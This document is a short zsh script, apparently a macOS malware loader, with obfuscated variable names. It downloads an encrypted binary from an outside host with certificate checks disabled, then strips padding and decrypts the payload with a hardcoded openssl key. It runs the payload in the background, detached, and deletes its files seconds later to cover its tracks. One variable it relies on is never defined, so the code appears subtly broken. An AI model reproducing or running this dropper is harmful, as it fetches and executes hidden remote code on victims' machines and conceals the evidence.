#!/bin/zsh
hxhsu=$(mktemp /tmp/a4vfks.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m1616ad3c991ba3b1.bin" -o "$hxhsuz" || exit 1
pr5seg=$(stat -f %z "$hxhsuz"); kfv8ey5=$(( pr5seg - 355 - 2448 ))
tail -c +$(( 355 + 1 )) "$hxhsuz" | head -c $kfv8ey5 | openssl enc -d -aes-256-cbc -k c1d71a8d87ea4341bf3ddc0a -out "$hxhsu" 2>/dev/null
[ -s "$hxhsu" ] && chmod 700 "$hxhsu" && ( "$hxhsu" & ) && disown
( sleep 3; rm -f "$hxhsu" "$hxhsuz" ) &>/dev/null &
